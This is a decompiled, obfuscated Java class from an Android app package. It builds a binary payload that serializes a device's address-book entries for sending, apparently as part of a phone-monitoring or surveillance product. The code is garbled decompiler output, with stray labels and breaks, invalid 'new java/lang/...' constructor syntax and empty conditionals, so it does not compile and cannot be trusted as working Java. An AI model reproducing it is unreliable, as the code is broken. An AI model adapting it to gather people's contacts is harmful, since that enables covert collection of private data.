package com.vvt.phoenix.prot.databuilder;

import com.vvt.io.d;
import com.vvt.phoenix.prot.command.e;
import com.vvt.phoenix.prot.command.t;
import com.vvt.phoenix.prot.event.s;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;

public class y
  extends r
{
  private static final boolean a;
  private static final boolean b;
  
  static
  {
    boolean bool1 = true;
    boolean bool2 = com.vvt.phoenix.a.a;
    if (bool2)
    {
      bool2 = bool1;
      a = bool2;
      bool2 = com.vvt.phoenix.a.d;
      if (!bool2) {
        break label34;
      }
    }
    for (;;)
    {
      b = bool1;
      return;
      bool2 = false;
      break;
      label34:
      bool1 = false;
    }
  }
  
  private int a(com.vvt.phoenix.prot.event.b paramb, OutputStream paramOutputStream)
  {
    boolean bool = false;
    Object localObject = null;
    e locale = paramb.c();
    int i = 0;
    for (;;)
    {
      bool = locale.a();
      if (!bool) {
        break;
      }
      localObject = locale.b();
      if (localObject != null)
      {
        i += 1;
        localObject = com.vvt.phoenix.prot.a.a.a((s)localObject);
        paramOutputStream.write((byte[])localObject);
      }
      else
      {
        bool = b;
        if (!bool) {}
      }
    }
    return i;
  }
  
  protected OutputStream a(OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)11);
    int i = 2;
    paramOutputStream.write(arrayOfByte, 0, i);
    bool = a;
    if (bool) {}
    return paramOutputStream;
  }
  
  protected String a()
  {
    return "SendAddrBookPayloadBuilder";
  }
  
  protected OutputStream b(OutputStream paramOutputStream)
  {
    short s = 0;
    Object localObject1 = null;
    int j = 2;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject2 = c();
    bool1 = localObject2 instanceof t;
    if (!bool1)
    {
      localObject2 = a();
      localObject3 = new java/lang/IllegalArgumentException;
      String str = "command data is not a SendAddressBook instance!";
      ((IllegalArgumentException)localObject3).<init>(str);
      com.vvt.phoenix.a.b.a((String)localObject2, (Exception)localObject3);
    }
    localObject2 = (t)c();
    int k = ((t)localObject2).b();
    paramOutputStream.write(k);
    long l = 0L;
    int m = 0;
    Object localObject4 = null;
    Object localObject3 = paramOutputStream;
    if (m < k)
    {
      com.vvt.phoenix.prot.event.b localb = ((t)localObject2).a(m);
      Object localObject5 = com.vvt.phoenix.prot.a.a.a(localb);
      ((OutputStream)localObject3).write((byte[])localObject5);
      boolean bool2 = d();
      label189:
      boolean bool3;
      if (bool2)
      {
        localObject1 = localObject3;
        localObject1 = ((FileOutputStream)localObject3).getChannel();
        l = ((FileChannel)localObject1).position();
        localObject5 = new byte[j];
        Object tmp165_163 = localObject5;
        tmp165_163[0] = 0;
        tmp165_163[1] = 0;
        ((OutputStream)localObject3).write((byte[])localObject5, 0, j);
        localObject5 = localObject4;
        localObject4 = localObject1;
        s = (short)a(localb, (OutputStream)localObject3);
        localObject1 = com.vvt.phoenix.a.a.a(s);
        bool3 = d();
        if (!bool3) {
          break label288;
        }
        bool3 = a;
        if (bool3) {}
        localObject1 = ByteBuffer.wrap((byte[])localObject1);
        ((FileChannel)localObject4).write((ByteBuffer)localObject1, l);
      }
      for (;;)
      {
        int i = m + 1;
        m = i;
        localObject1 = localObject4;
        localObject4 = localObject5;
        break;
        localObject3 = (ByteArrayOutputStream)localObject3;
        localObject4 = new java/io/ByteArrayOutputStream;
        ((ByteArrayOutputStream)localObject4).<init>();
        localObject5 = localObject3;
        localObject3 = localObject4;
        localObject4 = localObject1;
        break label189;
        label288:
        bool3 = a;
        if (bool3) {}
        ((ByteArrayOutputStream)localObject5).write((byte[])localObject1, 0, j);
        localObject1 = localObject3;
        localObject1 = (ByteArrayOutputStream)localObject3;
        ((ByteArrayOutputStream)localObject1).writeTo((OutputStream)localObject5);
        d.a((OutputStream)localObject3);
        localObject3 = localObject5;
      }
    }
    return (OutputStream)localObject3;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/y.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */